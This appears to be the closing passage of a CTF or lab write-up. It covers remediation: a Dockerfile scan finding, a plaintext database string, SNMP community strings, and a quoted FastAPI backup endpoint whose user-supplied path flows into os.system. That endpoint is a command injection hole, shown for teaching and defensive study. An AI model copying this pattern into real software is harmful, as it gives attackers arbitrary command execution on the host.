LOW: Add HEALTHCHECK instruction in your Dockerfile
════════════════════════════════════════════════════════════════════════════════
You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.

See https://avd.aquasec.com/misconfig/ds026

SNIP
```

The app could have enforce getting the database connection string rather than having it in plaintext in the `db.py` .  The main flaw was in trusting user input at `/app/api/admin.py` as shown in the code block. [str() function](https://docs.python.org/3/library/functions.html#func-str) is not a sanitization function. The developer should research on how to sanitize that input. 
```python
# Take a backup of the application
@router.post("/backup",dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def backup(payload: backup):
    os.system(f'tar -c -f {str(payload.path)}/app_backkup.tar {str(WORK_DIR)} &')
    return {"INFO": "Done!"}
```

**Fixing the Privilege Escalation Vector**  
Well normally configurations do have some sensitive credentials in them. They are almost always necessary for application to run. Some best practice though would be using a configuration management tool - consul, vault, ansible etc - which comes with some overhead. These tools too store those files in plain text after they must have been initially fetched. As earlier mentioned the infrastructure engineer would have used a non default community string and long enough too. 

#### References
[JWT - PortSwigger](https://portswigger.net/web-security/jwt) [JSON Web Token attacks and vulnerabilities - Invicti](https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/) [Pentesting SNMP - Hack Tricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)  [SNMP Enumeration(Port 161) - Gabb4r](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/snmp-enumeraion#snmpwalk) [Simple Network Management Protocol - Wikipedia](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol) [Python Security Best Practices Cheat Sheet - Snyk](https://go.snyk.io/rs/677-THP-415/images/Python_Cheatsheet_whitepaper.pdf) 


---  
>I build secure and reliable infrastructures, hunt for flaws in insecure systems and remediate them to meet compliance. Book a consultation [session](https://calendly.com/samuelnwoye/10min).